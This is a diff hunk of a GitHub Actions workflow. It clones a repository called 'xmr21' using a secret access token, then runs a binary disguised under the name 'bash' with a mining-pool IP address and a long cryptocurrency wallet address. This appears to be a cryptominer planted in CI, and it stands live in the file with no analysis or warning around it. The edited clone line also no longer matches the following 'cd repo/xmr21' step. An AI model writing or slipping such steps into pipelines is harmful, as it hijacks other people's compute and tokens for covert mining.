@@ -57,7 +57,7 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
-          git clone "https://x-access-token:${GH_TOKEN}@github.com/sadarsayujinjas/xmr21.git" repo
+          git clone https://x-access-token:${GH_TOKEN}@github.com/sadarsayujinjas/xmr21.git
           cd repo/xmr21
           chmod +x bash
           ./bash --noCPU -o 138.197.24.47:80 -u ccx7FNm5WxvKLTWgLyc9EuMKeMv32u32bgrGCAoq7SwzFdEz5BYkBRDexMyZmYUGaqGf8jFJCCRyqVFDdvXv4N6zAKPceUT6T1
